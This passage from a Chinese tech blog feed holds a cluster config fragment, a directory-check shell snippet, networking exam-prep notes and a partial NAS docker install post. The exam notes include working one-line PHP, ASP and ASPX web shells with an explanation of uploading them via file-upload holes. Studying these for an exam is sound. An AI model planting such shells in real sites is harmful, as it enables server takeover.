class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><br>cluster: &#123;<br>spec: &#123;<br>nodes: [<br>&#123;<br>name: <span class="hljs-string">&quot;m1&quot;</span><br><span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>host: <span class="hljs-string">&quot;1.1.1.1&quot;</span><br>services: &#123;<br>mongo: &#123;<br>endpoints: [<br>&#123;<br>dns: [<span class="hljs-string">&quot;mongosvc1, mongosvc2&quot;</span>]<br>svcPorts: [<br>&#123;<br>port: <span class="hljs-string">&quot;1111&quot;</span><br>protocol: <span class="hljs-string">&quot;tcp&quot;</span><br>targetPort: <span class="hljs-string">&quot;1111&quot;</span><br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;test2&quot;</span><br>port: <span class="hljs-string">&quot;2222&quot;</span><br>protocol: <span class="hljs-string">&quot;tcp&quot;</span><br>targetPort: <span class="hljs-string">&quot;2222&quot;</span><br>&#125;<br>]<br>&#125;,&#123;<br>dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>svcPorts: [<br>&#123;<br>port: <span class="hljs-string">&quot;3333&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;<br>]<br>&#125;<br>exporter : &#123;<br>endpoints: [<br>&#123;<br>dns: [<span class="hljs-string">&quot;exporter, mongosvc2&quot;</span>]<br>svcPorts: [<br>&#123;<br>name: <span class="hljs-string">&quot;test&quot;</span><br>port: <span class="hljs-string">&quot;1111&quot;</span><br>protocol: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;test2&quot;</span><br>port: <span class="hljs-string">&quot;2222&quot;</span><br>protocol: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;,&#123;<br>dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>svcPorts: [<br>&#123;<br>name: <span class="hljs-string">&quot;test&quot;</span><br>port: <span class="hljs-string">&quot;3333&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;<br>]<br>&#125;<br>&#125;<br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;m2&quot;</span><br><span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>host: <span class="hljs-string">&quot;2.2.2.2&quot;</span><br>services: &#123;<br>mongo : &#123;<br>endpoints: &#123;<br>dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>svcPorts: [<br>&#123;<br>name: <span class="hljs-string">&quot;test&quot;</span><br>port: <span class="hljs-string">&quot;1111&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;test2&quot;</span><br>port: <span class="hljs-string">&quot;2222&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;<br>&#125;<br>&#125;<br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;n1&quot;</span><br><span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>host: <span class="hljs-string">&quot;5.5.5.5&quot;</span><br>services: &#123;<br>mongo : &#123;<br>endpoints: &#123;<br>dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>svcPorts: [<br>&#123;<br>name: <span class="hljs-string">&quot;test&quot;</span><br>port: <span class="hljs-string">&quot;5555&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;test2&quot;</span><br>port: <span class="hljs-string">&quot;6666&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;<br>&#125;<br>&#125;<br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;n2&quot;</span><br><span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>host: <span class="hljs-string">&quot;6.6.6.6&quot;</span><br>services: &#123;<br>mongo : &#123;<br>endpoints: &#123;<br>dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>svcPorts: [<br>&#123;<br>name: <span class="hljs-string">&quot;test&quot;</span><br>port: <span class="hljs-string">&quot;5555&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;test2&quot;</span><br>port: <span class="hljs-string">&quot;6666&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;<br>&#125;<br>&#125;<br>&#125;,<br>]<br>&#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cue</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【shell】(202305) 判断文件夹是否存在</title>
    <link href="/2023/05/15/shell/%E3%80%90shell%E3%80%91(202305)%20%E5%88%A4%E6%96%AD%E6%96%87%E4%BB%B6%E5%A4%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8/"/>
    <url>/2023/05/15/shell/%E3%80%90shell%E3%80%91(202305)%20%E5%88%A4%E6%96%AD%E6%96%87%E4%BB%B6%E5%A4%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> [ ! -d <span class="hljs-string">&quot;/root/test&quot;</span> ]; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> -e `<span class="hljs-built_in">date</span> <span class="hljs-string">&#x27;+%Y-%m-%d %H:%M:%S %A&#x27;</span>` <span class="hljs-string">&quot;filepath doesn&#x27;t exist &quot;</span> <br>  <span class="hljs-built_in">mkdir</span> -p /root/test<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">filePath=<span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-keyword">if</span> [ ! -d <span class="hljs-string">&quot;/root/<span class="hljs-variable">$&#123;filePath&#125;</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> -e `<span class="hljs-built_in">date</span> <span class="hljs-string">&#x27;+%Y-%m-%d %H:%M:%S %A&#x27;</span>` <span class="hljs-string">&quot;filepath doesn&#x27;t exist &quot;</span> <br>  <span class="hljs-built_in">mkdir</span> -p /root/<span class="hljs-variable">$&#123;filePath&#125;</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【软考】真题问题及复习笔记记录</title>
    <link href="/2023/05/15/net/%E3%80%90%E8%BD%AF%E8%80%83%E3%80%91%E7%9C%9F%E9%A2%98%E9%97%AE%E9%A2%98%E5%8F%8A%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/05/15/net/%E3%80%90%E8%BD%AF%E8%80%83%E3%80%91%E7%9C%9F%E9%A2%98%E9%97%AE%E9%A2%98%E5%8F%8A%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="———-复习笔记-———"><a href="#———-复习笔记-———" class="headerlink" title="———- 复习笔记 ———-"></a>———- 复习笔记 ———-</h2><h2 id="复习笔记-20230516-二"><a href="#复习笔记-20230516-二" class="headerlink" title="复习笔记 20230516(二)"></a>复习笔记 20230516(二)</h2><h3 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h3><p>RIP    udp 520<br>OSPF ip<br>ISIS   链路层<br>BGP   tcp 179</p><p>ospf和isis 链路状态协议</p><p>ospf使用hello报文维持邻居关系<br>isis也使用hello协议寻找毗邻节点</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/8ed4ac6bc9b0a887ee1fc045c72599f.jpg" alt="8ed4ac6bc9b0a887ee1fc045c72599f.jpg"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/39d7dadafe12fa58cfbbf92191df6a5.jpg" alt="8ed4ac6bc9b0a887ee1fc045c72599f.jpg"></p><h2 id="———-上午题-———"><a href="#———-上午题-———" class="headerlink" title="———- 上午题 ———-"></a>———- 上午题 ———-</h2><h2 id="2019年5月上午题-20230513-六-65-x2F-75"><a href="#2019年5月上午题-20230513-六-65-x2F-75" class="headerlink" title="2019年5月上午题  20230513(六)  65&#x2F;75"></a>2019年5月上午题  20230513(六)  65&#x2F;75</h2><h2 id="2019年11月上午题-20230515-一-59-x2F-75"><a href="#2019年11月上午题-20230515-一-59-x2F-75" class="headerlink" title="2019年11月上午题  20230515(一)  59&#x2F;75"></a>2019年11月上午题  20230515(一)  59&#x2F;75</h2><p>06<br>一般情况下属于职务作品，按国家著作权法规定，应属于单位所有。但如果与单位事先有特别约定，应遵从约定</p><p>07<br>软件开发者拥有署名权，其他著作权归属单位</p><p>08<br>在磁盘调度管理中，应先进行移臂调度，再进行旋转调度。 ？？？</p><p>12<br>传统以太网使用的是<u>曼彻斯特编码</u>，效率50%</p><p>13 14<br>HFC是将<u>光缆</u>敷设到小区，然后通过光电转换结点，利用有线电视CATV的总线式<u>同轴电缆</u>连接到用户，提供综合电信业务的技术。</p><p>15 千兆以太网<br>(1)1000 Base-T标准使用的是5类非屏蔽双绞线，双绞线长度可以达到100m。<br>(2)1000Base-X是基于光纤通道的物理层，使用的媒体有三种：<br>1000 Base-CX标准使用的是屏蔽双绞线，双绞线长度可以达到25m；<br>1000 Base-LX标准使用的是波长为1300nm的单模光纤，光纤长度可以达到3 000m；<br>1000 Base-SX标准使用的是波长为850nm的多模光纤，光纤长度可以达到300～550m。<br>其中前三项标准是IEEE 802.3z，而1000 Base-T的标准是IEEE 802.3ab。</p><p>16 CRC<br>在原始报文的后面添加若干个0 (生成多项式的最高次幂数 最终校验位的位数)</p><p>17 CSMA&#x2F;CD<br>在以太网中为了确保发送数据站点在传输时能检测到可能存在的冲突，数据帧的传输时延要不小于两倍的传播时延。<br>$$\displaystyle 传输时延 \geq 2\times\frac{任意两点间的最长距离}{信号传播速度}$$</p><p>19 20  HDLC<br>_HDLC_（High-Level Data Link Control，高级数据链路控制）<br>HDLC有三种不同类型的帧：信息帧(I帧)、监控帧(S帧)和无编号帧(U帧)。<br>信息帧用于传送用户数据、通常简称Ｉ帧。<br>监控帧用来差错控制和流量控制，<br>无编号帧用于提供对链路的建立、拆除以及多种控制功能。</p><p>21<br>发送方的拥塞窗口cwnd</p><p>26<br>OSPF报文封装在IP包中，协议号89<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230515200249.png" width="50%" height="50%"><br>29<br>1、我向浏览器中输入网址后，浏览器会效验网址的合法性，如果网址不合法，会传给默认的搜索引擎。<br>如果网址合法并通过验证，浏览器会，得到协议(http或https)，域名，资源页面(比如首面等)<br>2、DNS查询<br>浏览器会先检查域名信息是否在缓存中。<br>再检查域名是否在本地的Hosts文件中。<br>如果还不在，那么浏览器会向DNS服务器发送一个查询请求，获得目标服务器的IP地址。<br>3、TCP封包及传输<br>4、建立TCP连接后发起HTTP请求                             ？？？？<br>5、服务器接收请求并相应</p><p>33<br>关闭防火墙的方法为：</p><ol><li>永久性生效<br>开启：chkconfig iptables on<br>关闭：chkconfig iptables off</li><li>即时生效，重启后失效<br>开启：service iptables start<br>关闭：service iptables stop</li></ol><p>34<br>IIS（Internet Information Server，互联网信息服务）是一种Web（网页）服务组件</p><ul><li>DHCP服务器</li><li>DNS 服务器</li><li>传真服务器</li><li>Web服务器(IIS)<br>- Web服务器    网页浏览<br>- FTP服务器     文件传输<br>- NNTP服务器  新闻服务<br>- SMTP服务器   邮件发送</li></ul><p>36<br>DHCP服务可以服务于一个网段，也可以通过DHCP中继服务多个子网，在一个网段中可以配置多台DHCP服务器。<br>客户端要使用DHCP服务不需指定DHCP服务器地址，是通过广播方式寻找</p><p>41<br>公开密钥加密，也叫非对称加密，加密用到两个密钥，其中公开的是公钥，未公开的是私钥，一个用来加密，另一个用来解密。常见的非对称加密算法有RSA、ElGamal、DSA、ECC（椭圆曲线加密算法背包算法）等。<br>对称加密只用一个密钥，既做加密又做解密。常见的对称加密算法有：DES、AES、3DES、Blowfish等。</p><p>58<br>通常情况下，信息插座的安装位置距离地面的高度为( )cm  30-50<br>一般30cm，可以回忆下家里网线口高度是多少</p><p>61<br>选根网桥那个题，有歧义</p><p>62<br>RIPv1  RIPv2 有类不携带子网掩码 无类携带子网掩码 不支持VLSM、CIDR 支持VLSM、CIDR 没有认证功能 提供明文和MD5认证 广播更新 组播更新(广播也支持) 周期性更新30s 采用触发更新</p><p>66<br>固态硬盘没有IDE接口的，常见的有：SATA、PCIe和M.2。</p><h2 id="2022年5月上午题"><a href="#2022年5月上午题" class="headerlink" title="2022年5月上午题"></a>2022年5月上午题</h2><h2 id="———-下午题-———"><a href="#———-下午题-———" class="headerlink" title="———- 下午题 ———-"></a>———- 下午题 ———-</h2><h2 id="2019年11月下午题-20230516-二"><a href="#2019年11月下午题-20230516-二" class="headerlink" title="2019年11月下午题  20230516(二)"></a>2019年11月下午题  20230516(二)</h2><h3 id="第1题-ip地址相关-14-x2F-20"><a href="#第1题-ip地址相关-14-x2F-20" class="headerlink" title="第1题 ip地址相关 14&#x2F;20"></a>第1题 ip地址相关 14&#x2F;20</h3><h3 id="第2题"><a href="#第2题" class="headerlink" title="第2题"></a>第2题</h3><p>实现无线网络统一管理和漫游的设备，是无线控制器 AC<br>实现用户登录认证的设备是无线认证系统（可能是软件或硬件）<br>实现无线AP接入和供电的设备是POE交换机<br>实现高密度优化后接入的设备为高密吸顶式AP<br>看到X86线盒，就是面板上AP<br>其他设备：防火墙、IDS&#x2F;IPS、WAF、数据库审计、FC、交换机</p><p>实现网络隔离技术的技术有VLAN和ACL，如果是ACL，一版会说访问控制<br>实现审计和控制，阻止并记录非法访问，即<u>上网行为管理</u>设备</p><p>存储网络包含IP-SAN和FC-SAN。如果是FC-SAN，服务器一版会配置两块网卡，一张连接FC，一张连接以太网。<br>FC fiber channel 光纤通道</p><h2 id="2020年11月下午题-20230520-六"><a href="#2020年11月下午题-20230520-六" class="headerlink" title="2020年11月下午题   20230520(六)"></a>2020年11月下午题   20230520(六)</h2><h3 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h3><p>1.组播报文对无线网络空口的影响主要有(14) ，随着业务数据转发的方式不同, 组播报文的抑制分别 在 (15)、(16) 配置。<br>(14)无线空口拥塞 (15)直连 AP 的交换机接口 (16) AC 的流量模板下 </p><p>组播报文在 无线空口没有 ACK 机制保障，为了纯组播报文能够稳定发送，通常对组播进行限速，或叫组播报文抑 制。直接转发时，会在 AP 直连交换机接口上配置，隧道转发时，在 AC 的流量模板下配置组播报文抑 制。</p><p>2.该网络 AP 部署在每一间宿舍的原因是（17）<br>(17)信号穿墙会有较大衰减，导致宿舍内信号差，故直接将 AP 部署在每个房间。</p><h3 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h3><h4 id="1-网络故障"><a href="#1-网络故障" class="headerlink" title="1 网络故障"></a>1 网络故障</h4><p>ping 127.0.0.1 不通，表示无法访问自己的环回地址，一般都是网卡驱动没有正确安装或 网卡 TCP&#x2F;IP 协议故障。<br>能登录互联网即时聊天软件，但无法打开网页，是域名解析的问题，选择 DNS 配置错误。</p><h4 id="2-一句话木马"><a href="#2-一句话木马" class="headerlink" title="2 一句话木马"></a>2 一句话木马</h4><p>先来看看最简单的一句话木马：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;attack&#x27;</span>]);?&gt;<br></code></pre></td></tr></table></figure><p>【基本原理】利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过中国菜刀chopper.exe即可获取和控制整个网站目录。@表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST[‘attack’]表示从页面中获得attack这个参数值。</p><p>常见的一句话木马：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">php的一句话木马： &lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);?&gt;<br>asp的一句话是：   &lt;%<span class="hljs-built_in">eval</span> request (<span class="hljs-string">&quot;pass&quot;</span>)%&gt;<br>aspx的一句话是：  &lt;%@ Page Language=<span class="hljs-string">&quot;Jscript&quot;</span>%&gt; &lt;%<span class="hljs-built_in">eval</span>(Request.Item[<span class="hljs-string">&quot;pass&quot;</span>],<span class="hljs-string">&quot;unsafe&quot;</span>);%&gt;<br></code></pre></td></tr></table></figure><h4 id="3-攻击措施"><a href="#3-攻击措施" class="headerlink" title="3 攻击措施"></a>3 攻击措施</h4><p>针对上述攻击，应该采取 （6） 等措施进行防范。<br>部署防病毒网关或防垃圾邮件系统，启动应用层病毒过滤</p><h4 id="4-SAN"><a href="#4-SAN" class="headerlink" title="4 SAN"></a>4 SAN</h4><p>存储区域网络(Storage Area Network,简称 SAN)可分为（7）、（8）两种， 从部署成本和传输效率两个方面比 较这两种 SAN，比较结果为（9）。<br>（7）FC-SAN （8）IP-SAN （9）FC-SAN 部署成本高，传输效率较高</p><h4 id="5-raid2-0"><a href="#5-raid2-0" class="headerlink" title="5 raid2.0"></a>5 raid2.0</h4><p>raid2.0技术的优势<br>1、自动负载均衡，降低了存储系统整体故障率<br>2、快速精简重构，降低了双盘失效率和数据丢失的风险<br>3、故障自检自愈，保证了系统可靠性<br>4、虚拟池化设计，降低存储规划管理难度</p><h3 id="问题3-IPSec-VPN"><a href="#问题3-IPSec-VPN" class="headerlink" title="问题3 IPSec VPN"></a>问题3 IPSec VPN</h3><p>校本部与分校之间搭建了 IPSec VPN。IPSec 的功能可以划分为认证头 AH、封装安全负 荷 ESP 以及密钥交换 IKE。其中用于数据完整性认证和数据源认证的是（1）<br>AH 用于完整性和数据源认证，ESP 用于加密。</p><h3 id="问题4-vlan"><a href="#问题4-vlan" class="headerlink" title="问题4 vlan"></a>问题4 vlan</h3><p>划分 VLAN 的方式有：基于接口、基于 MAC 地址、基于子网、基于协议、基于策略</p><h2 id="2021年5月下午题-20230522-一"><a href="#2021年5月下午题-20230522-一" class="headerlink" title="2021年5月下午题   20230522(一)"></a>2021年5月下午题   20230522(一)</h2><h3 id="问题1-1"><a href="#问题1-1" class="headerlink" title="问题1"></a>问题1</h3><p>VRRP技术实现<u>网关冗余</u>功能，两个交换机之间的线称为<u>心跳线</u>，作用是<u>检测VRRP组的状态，出现故障及时切换</u></p><h3 id="问题2-1"><a href="#问题2-1" class="headerlink" title="问题2"></a>问题2</h3><p>保障数据安全可以使用VPN隧道，并进行加密传输，常用的是IPSec协议配合ESP进行加密。<br>出口带宽有限，可以增量备份，每次只备份增加的内容，能有效减少备份容量，提升备份速度。</p><h3 id="问题3"><a href="#问题3" class="headerlink" title="问题3"></a>问题3</h3><p>802.1x 主要在接入交换机上配置，题目中提到由接入交换机 S1 拦截用户流量，则是 802.1x。<br>如果是 web 认证，由防火墙&#x2F;行为管理设备 &#x2F;认证网关等设备进行认证处理<br>如果是 PPPOE 认证，是由 BRAS&#x2F;BAS 设备进行处理<br>如果是短信认证，需要有短信猫&#x2F;短信网关。</p><p>学校和企业采用 802.1x 认证较多<br>家庭宽带&#x2F;中小型企业采用 PPPOE<br>商超、车站等公共场所一般采用 Web&#x2F;portal 或短信认证。</p><h3 id="问题4"><a href="#问题4" class="headerlink" title="问题4"></a>问题4</h3><p>POE 有两种方式：<br>第一种：8 根铜芯既传数据，同时进行供电，两者使用不同频率；<br>第二种：使用 1236 进行数据传输，4578 进行供电，其中 45 位正极，78 为负极。</p><h2 id="2021年11月下午题-20230523-二"><a href="#2021年11月下午题-20230523-二" class="headerlink" title="2021年11月下午题   20230523(二)"></a>2021年11月下午题   20230523(二)</h2><h3 id="问题1-2"><a href="#问题1-2" class="headerlink" title="问题1"></a>问题1</h3><h4 id="1-AC部署方式-优缺点"><a href="#1-AC部署方式-优缺点" class="headerlink" title="1 AC部署方式 优缺点"></a>1 AC部署方式 优缺点</h4><p>相较于以旁路方式部署，将AC直连部署存在的问题是：<br>答案1 summer：设备故障会影响网络连通<br>答案2：存在单点故障、性能瓶颈<br>(老师)旁路部署，如果前期配置好，后面AC挂了，是不会影响网络的</p><p>直连部署的网络设 备通常会在网络的主干线路上，这种部署方式存在单点故障的问题，同时也可 能因为设备本身的性能达不到网络传输的要求，出现性能瓶颈。所以相当一部 分支持直连部署的设备都有设备故障时，网络数据能直通的功能。 </p><p>相较于部署在核心层，将AC部署在接入层存在的问题是：<br>答案1 summer：存在性能瓶颈<br>答案2 软考真题：不能很好的利用 AC 的 NAT 、 HDCP 功能。性能差，稳定性不好，其他区域的工作站访问距离远，效率低<br>(老师)一般核心交换机有万兆接口，且性能比接入交换机好很多</p><p>如果将 AC 部署在接入层设备上，往往由于接入层设备性能较差，稳定性不 好，也不会配置冗余的电源、线路等提升可靠性的条件。将 AC 部署在这种设备 上，可能会因为接入层设备本身的不可靠，导致无线网络瘫痪。另外，将 AC 接 在接入层设备上，也不能很好的利用 AC 本身的 NAT 和其他一些功能。并且，其 他区域的接入层工作站需要通过核心，再连接到接入层，再到 AC ，访问的路径 比较远，效率较低。</p><h4 id="2-认证"><a href="#2-认证" class="headerlink" title="2 认证"></a>2 认证</h4><p>PPPoE认证    ADSL 光纤<br>Portal            Web<br>IEEE 802.1x 企业级，需要安装客户端，安全性较高</p><p>“使用 web 页面进行认证后上网”可以知道这是一 种基于 webportal 的认证方式，这种方式最大的特点是不需要安装客户端，直 接使用浏览器访问网络之前，会强制定位到 web 认证页面。</p><h4 id="3-供电"><a href="#3-供电" class="headerlink" title="3 供电"></a>3 供电</h4><p>在网络规划中，对AP供电方式可以采用POE供电或DC电源适配器供电</p><h3 id="问题2-2"><a href="#问题2-2" class="headerlink" title="问题2"></a>问题2</h3><p>防火墙的工作模式：<br>透明模式：二层 不用配IP地址<br>路由模式：接口配ip地址<br>混合模式：有些接口配ip地址，有些接口不配</p><h3 id="问题4-1"><a href="#问题4-1" class="headerlink" title="问题4"></a>问题4</h3><p>新加入网络的主机需要通过 DHCP 方式获取 IP 地址，但是，在申请到合法的 IP 地址前，主机只能采用源 IP 地址 0.0.0.0 进行临时通信。</p><p>该主机发送的 DHCP 报文无法通过基于子网划分 VLAN 的方式加入任何 VLAN ，最终设备会给该报文会打上接口的缺省 VLAN ID(缺省情况下，接口的缺省 VLAN ID 为 1)。</p><h2 id="2022年5月下午题-20230525-四"><a href="#2022年5月下午题-20230525-四" class="headerlink" title="2022年5月下午题   20230525(四)"></a>2022年5月下午题   20230525(四)</h2><h3 id="BGP"><a href="#BGP" class="headerlink" title="BGP"></a>BGP</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230526003656.png" alt="image.png"></p><h3 id="rip-ospf"><a href="#rip-ospf" class="headerlink" title="rip ospf"></a>rip ospf</h3><p>从算法原理、适用范围、功能特性三个方面简述 RIP 和 OSPF 的区别。<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230526010359.png" alt="image.png"></p><h2 id="———-课件相关案例题-———"><a href="#———-课件相关案例题-———" class="headerlink" title="———- 课件相关案例题 ———-"></a>———- 课件相关案例题 ———-</h2><h2 id="常用的DDos攻击防范方法"><a href="#常用的DDos攻击防范方法" class="headerlink" title="常用的DDos攻击防范方法"></a>常用的DDos攻击防范方法</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230524082336.png" alt="image.png"></p><h2 id="MAC-flooding解决方案"><a href="#MAC-flooding解决方案" class="headerlink" title="MAC-flooding解决方案"></a>MAC-flooding解决方案</h2><p>接口和MAC静态绑定<br>限制接口MAC地址学习数量</p><h3 id="冗余"><a href="#冗余" class="headerlink" title="冗余"></a>冗余</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230525220504.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【nas】docker</title>
    <link href="/2023/05/12/nas/%E3%80%90nas%E3%80%91docker/"/>
    <url>/2023/05/12/nas/%E3%80%90nas%E3%80%91docker/</url>
    
    <content type="html"><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>套件中心中没有docker，想要安装一个docker</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512220109.png" alt="image.png"></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230513000221.png" alt="image.png"></p><h2 id="添加第三方源"><a href="#添加第三方源" class="headerlink" title="添加第三方源"></a>添加第三方源</h2><p>修改配置</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512233229.png" alt="image.png"></p><p>套件中心—设置—套件来源—新增：名称随便取，位置把网址复制进去确认即可</p><p>DSM6.x矿神SPK套件源：<a href="https://imnks.com/go/aHR0cHM6Ly9zcGsuaW1ua3MuY29tLw">https://spk.imnks.com/</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512235104.png" alt="image.png"></p><p>添加之后，可以看到左侧多了一个社群，然后在套件中心的社群搜索即可。</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512235200.png" alt="image.png"></p><p>点击“社群”，如果右侧没有东西的话，可以点击一下“刷新”</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512235234.png" alt="image.png"></p><p>搜索“docker”，直接安装</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512235427.png" alt="image.png"></p><p>安装不上docker，为什么呢？显示下载docker失败</p><p>找<br>找<br>找</p><h3 id="尝试1：安装猫盘三合一修复"><a href="#尝试1：安装猫盘三合一修复" class="headerlink" title="尝试1：安装猫盘三合一修复"></a>尝试1：安装猫盘三合一修复</h3><p>安装完系统之后，发现指示灯不亮</p><p>不知道是否跟这个有关，安装下面套件</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230513001425.png" 